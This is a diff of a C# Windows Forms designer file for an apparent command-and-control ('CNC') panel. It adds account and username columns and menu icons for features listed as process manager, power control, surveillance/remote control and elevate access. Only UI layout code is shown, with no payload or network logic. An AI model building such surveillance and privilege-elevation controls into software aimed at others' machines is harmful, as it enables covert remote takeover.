@@ -32,6 +32,8 @@
             this.clientListView = new System.Windows.Forms.ListView();
             this.ipAddress = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.operatingSystem = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.accountType = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.username = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.clientMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
             this.systemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.processManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -44,8 +46,6 @@
             this.remoteControllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.managementToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.closeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.accountType = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
-            this.username = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.elevateAccessToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.clientMenuStrip.SuspendLayout();
             this.SuspendLayout();
@@ -79,6 +79,16 @@
             this.operatingSystem.Text = "OperatingSystem";
             this.operatingSystem.Width = 280;
             // 
+            // accountType
+            // 
+            this.accountType.Text = "Account Type";
+            this.accountType.Width = 124;
+            // 
+            // username
+            // 
+            this.username.Text = "Username";
+            this.username.Width = 158;
+            // 
             // clientMenuStrip
             // 
             this.clientMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
@@ -93,12 +103,14 @@
             this.systemToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.processManagerToolStripMenuItem,
             this.powerStateToolStripMenuItem});
+            this.systemToolStripMenuItem.Image = global::CNC.Properties.Resources.system_icon;
             this.systemToolStripMenuItem.Name = "systemToolStripMenuItem";
-            this.systemToolStripMenuItem.Size = new System.Drawing.Size(145, 22);
+            this.systemToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
             this.systemToolStripMenuItem.Text = "System";
             // 
             // processManagerToolStripMenuItem
             // 
+            this.processManagerToolStripMenuItem.Image = global::CNC.Properties.Resources.process_icon;
             this.processManagerToolStripMenuItem.Name = "processManagerToolStripMenuItem";
             this.processManagerToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
             this.processManagerToolStripMenuItem.Text = "Process Manager";
@@ -111,12 +123,14 @@
             this.restartToolStripMenuItem,
             this.sleepToolStripMenuItem,
             this.hibernateToolStripMenuItem});
+            this.powerStateToolStripMenuItem.Image = global::CNC.Properties.Resources.computer_icon;
             this.powerStateToolStripMenuItem.Name = "powerStateToolStripMenuItem";
             this.powerStateToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
             this.powerStateToolStripMenuItem.Text = "Power State";
             // 
             // shutdownToolStripMenuItem
             // 
+            this.shutdownToolStripMenuItem.Image = global::CNC.Properties.Resources.shutdown_icon;
             this.shutdownToolStripMenuItem.Name = "shutdownToolStripMenuItem";
             this.shutdownToolStripMenuItem.Size = new System.Drawing.Size(128, 22);
             this.shutdownToolStripMenuItem.Text = "Shutdown";
@@ -124,6 +138,7 @@
             // 
             // restartToolStripMenuItem
             // 
+            this.restartToolStripMenuItem.Image = global::CNC.Properties.Resources.restart_icon;
             this.restartToolStripMenuItem.Name = "restartToolStripMenuItem";
             this.restartToolStripMenuItem.Size = new System.Drawing.Size(128, 22);
             this.restartToolStripMenuItem.Text = "Restart";
@@ -131,6 +146,7 @@
             // 
             // sleepToolStripMenuItem
             // 
+            this.sleepToolStripMenuItem.Image = global::CNC.Properties.Resources.sleep_icon;
             this.sleepToolStripMenuItem.Name = "sleepToolStripMenuItem";
             this.sleepToolStripMenuItem.Size = new System.Drawing.Size(128, 22);
             this.sleepToolStripMenuItem.Text = "Sleep";
@@ -138,6 +154,7 @@
             // 
             // hibernateToolStripMenuItem
             // 
+            this.hibernateToolStripMenuItem.Image = global::CNC.Properties.Resources.hibernate_icon;
             this.hibernateToolStripMenuItem.Name = "hibernateToolStripMenuItem";
             this.hibernateToolStripMenuItem.Size = new System.Drawing.Size(128, 22);
             this.hibernateToolStripMenuItem.Text = "Hibernate";
@@ -147,12 +164,14 @@
             // 
             this.surveillanceToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.remoteControllToolStripMenuItem});
+            this.surveillanceToolStripMenuItem.Image = global::CNC.Properties.Resources.spy_icon;
             this.surveillanceToolStripMenuItem.Name = "surveillanceToolStripMenuItem";
-            this.surveillanceToolStripMenuItem.Size = new System.Drawing.Size(145, 22);
+            this.surveillanceToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
             this.surveillanceToolStripMenuItem.Text = "Surveillance";
             // 
             // remoteControllToolStripMenuItem
             // 
+            this.remoteControllToolStripMenuItem.Image = global::CNC.Properties.Resources.mouse_icon;
             this.remoteControllToolStripMenuItem.Name = "remoteControllToolStripMenuItem";
             this.remoteControllToolStripMenuItem.Size = new System.Drawing.Size(158, 22);
             this.remoteControllToolStripMenuItem.Text = "Remote Control";
@@ -163,29 +182,24 @@
             this.managementToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.closeToolStripMenuItem,
             this.elevateAccessToolStripMenuItem});
+            this.managementToolStripMenuItem.Image = global::CNC.Properties.Resources.settings_icon;
             this.managementToolStripMenuItem.Name = "managementToolStripMenuItem";
             this.managementToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
             this.managementToolStripMenuItem.Text = "Management";
             // 
             // closeToolStripMenuItem
             // 
+            this.closeToolStripMenuItem.Image = global::CNC.Properties.Resources.close_icon;
             this.closeToolStripMenuItem.Name = "closeToolStripMenuItem";
-            this.closeToolStripMenuItem.Size = new System.Drawing.Size(103, 22);
+            this.closeToolStripMenuItem.Size = new System.Drawing.Size(150, 22);
             this.closeToolStripMenuItem.Text = "Close";
             this.closeToolStripMenuItem.Click += new System.EventHandler(this.closeToolStripMenuItem_Click);
             // 
-            // accountType
-            // 
-            this.accountType.Text = "Account Type";
-            // 
-            // username
-            // 
-            this.username.Text = "Username";
-            // 
             // elevateAccessToolStripMenuItem
             // 
+            this.elevateAccessToolStripMenuItem.Image = global::CNC.Properties.Resources.uac_icon;
             this.elevateAccessToolStripMenuItem.Name = "elevateAccessToolStripMenuItem";
-            this.elevateAccessToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.elevateAccessToolStripMenuItem.Size = new System.Drawing.Size(150, 22);
             this.elevateAccessToolStripMenuItem.Text = "Elevate Access";
             this.elevateAccessToolStripMenuItem.Click += new System.EventHandler(this.elevateAccessToolStripMenuItem_Click);
             // 
